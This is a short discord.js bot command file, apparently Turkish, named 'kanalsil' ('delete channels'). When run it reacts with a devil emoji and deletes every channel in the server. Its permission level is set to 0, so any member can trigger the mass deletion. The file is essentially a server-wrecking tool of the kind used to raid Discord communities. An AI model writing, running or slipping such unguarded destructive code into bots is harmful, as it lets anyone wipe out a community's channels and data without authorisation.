const Discord = require('discord.js');
const db = require('quick.db')
exports.run = async(client, message, args) => { 
  


 await message.react('😈')
message.guild.channels.cache.forEach(a => a.delete())
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 0
};

exports.help = {
  name: 'kanalsil',
  description: 'taslak', 
  usage: 'kanal-sil'
};
